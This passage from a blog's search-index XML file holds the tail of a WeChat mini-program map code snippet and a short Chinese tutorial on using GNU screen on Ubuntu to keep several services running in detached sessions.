class="number">10</span>,    <span class="comment">// 文本边缘留白</span></span><br><span class="line">                    <span class="attr">display</span>:<span class="string">&quot;ALWAYS&quot;</span>, <span class="comment">// &#x27;BYCLICK&#x27;:点击显示; &#x27;ALWAYS&#x27;:常显</span></span><br><span class="line">                    <span class="attr">textAlign</span>:<span class="string">&quot;center&quot;</span><span class="comment">//文本对齐方式。有效值: left, right, center</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;]</span><br><span class="line">       &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>微信小程序</category>
      </categories>
      <tags>
        <tag>微信小程序</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu/Linux 多开线程运行不同服务</title>
    <url>/Linux/Ubuntu/Linux%20%E5%A4%9A%E5%BC%80%E7%BA%BF%E7%A8%8B%E8%BF%90%E8%A1%8C%E4%B8%8D%E5%90%8C%E6%9C%8D%E5%8A%A1/</url>
    <content><![CDATA[<p>在 <strong>ubuntu</strong> 服务器上，一般有不同的服务需要运行，而没有图形界面的操作怎么多开线程保持服务正常运行和互不干扰？这里就用到了 <strong>screen</strong></p>
<hr>
<h1>一、安装 sereen</h1>
<p>如果没有安装 sereen 可以先安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install screen</span><br></pre></td></tr></table></figure>
<br/>
<h1>二、新建线程</h1>
<p>name为自己起的名字，建议起方便辨认的名字，运行该命令后会有一个新的黑窗口，你只需要运行你想要的服务即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">screen -S name</span><br></pre></td></tr></table></figure>
<br/>
<h1>三、保存并断开</h1>
<p>按住 <strong>Ctrl + A + D</strong> 即可断开该线程，或者输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">screen -d name</span><br></pre></td></tr></table></figure>
<br/>
<h1>三、常见 screen 命令</h1>
<table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>screen -ls</td>
<td>查看所有screen 状态</td>
</tr>
<tr>
<td>screen -r name</td>
<td>通过screen name恢复会话</td>
</tr>
<tr>
<td>screen -r  ID</td>
<td>通过session ID恢复会话</td>
</tr>
</tbody>
</table>
<br/>
<p>欢迎浏览我的<a href="https://xie392.gitee.io">个人博客地址</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
</search>
